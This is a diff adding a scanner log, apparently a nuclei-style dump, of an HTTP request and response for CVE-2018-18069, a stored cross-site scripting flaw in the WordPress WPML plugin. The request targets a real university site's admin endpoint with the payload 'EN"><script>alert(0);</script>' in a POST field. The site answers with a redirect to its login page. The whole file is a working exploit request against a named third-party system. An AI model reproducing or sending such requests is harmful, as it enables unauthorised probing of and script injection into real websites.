@@ -1,0 +1,29 @@
+[CVE-2018-18069] Dumped HTTP request for https://ess.science.unimelb.edu.au/wp-admin/admin.php
+
+
+POST /wp-admin/admin.php HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 92
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+icl_post_action=save_theme_localization&locale_file_name_en=EN"><script>alert(0);</script>
+
+[CVE-2018-18069] Dumped HTTP response https://ess.science.unimelb.edu.au/wp-admin/admin.php
+
+HTTP/1.1 302 Found
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://blogs.unimelb.edu.au/ess/wp-login.php?redirect_to=https%3A%2F%2Fblogs.unimelb.edu.au%2Fess%2Fwp-admin%2Fadmin.php&reauth=1
+Server: openresty
+X-Cache-Bypass-Reason: Special url
+X-Redirect-By: WordPress
+
+
